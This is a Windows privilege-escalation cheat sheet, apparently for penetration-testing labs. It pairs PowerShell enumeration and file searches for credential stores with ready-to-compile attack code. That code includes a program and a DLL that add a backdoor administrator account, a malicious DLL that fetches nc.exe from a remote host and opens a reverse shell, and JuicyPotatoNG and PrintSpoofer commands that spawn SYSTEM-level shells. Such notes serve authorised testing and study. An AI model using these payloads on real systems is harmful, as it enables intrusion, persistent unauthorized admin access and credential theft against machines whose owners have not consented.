# Windows Privesc Cheatsheet

Checks to follow:

- [x] Username and hostname
- [x] Group memberships of the current user
- [x] Existing users and groups
- [x] Operating system, version and architecture
- [x] Network information - Installed applications
- [x] Running processes
___

### Information GoldMine Powershell

**User and Groups checks**

* `Get-LocalUser`
* `Get-LocalGroup`
* `Get-LocalGroupMember Administrators`

**Always check the PowerShell history of a user.**

* `Get-History`
* `(Get-PSReadlineOption).HistorySavePath`
* `Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -FilterXPath '*[System[(EventID=4104)]]' -MaxEvents 5 | Format-Table TimeCreated, Message -Wrap`

**File Search**

* `Get-ChildItem -Path C:\Users\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`
* `Get-ChildItem -Path C:\Users\ -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`
* `Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.config,*.ini -File -Recurse -ErrorAction SilentlyContinue`

**Service Binary Hijack**

* `Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`

```c++
#include <stdlib.h>
int main () {
    int i;
    i = system ("net user dave2 password123! /add");
    i = system ("net localgroup administrators dave2 /add");
    return 0;
}
```

And compile it: `x86_64-w64-mingw32-gcc adduser.c -o adduser.exe`

___

### DLL Hijack

**Standard Search Order for DLLs**

1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.

[Hacktricks DLL Hijack](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking)

**Cross Compile DLL**

```bash
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
```

**Malicious DLL Template**

Catch a reverse shell

```c++
#include <stdlib.h>
#include <windows.h>
BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
            int i;
            i = system("copy \\\\192.168.119.162\\tmp\\nc.exe");
            i = system("nc.exe 192.168.119.162 1337 -e cmd");
            break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

Attempt to create a new admin user

```c++
#include <stdlib.h>
#include <windows.h>
BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
            int i;
            i = system ("net user dave2 password123! /add");
  	        i = system ("net localgroup administrators dave2 /add");
            break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

### Privesc with SeImpersonatePrivilege

[Hacktricks Abusing Tokens](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#seimpersonateprivilege-3.1.1)

```cmd
C:\Users\Public> .\JuicyPotatoNG.exe -p C:\Windows\System32\cmd.exe -a "/c C:\Users\Public\nc.exe -e cmd.exe 192.168.45.189 80" -t *
```

```cmd
C:\Users\Public> .\PrintSpoofer.exe -i -c cmd.exe
```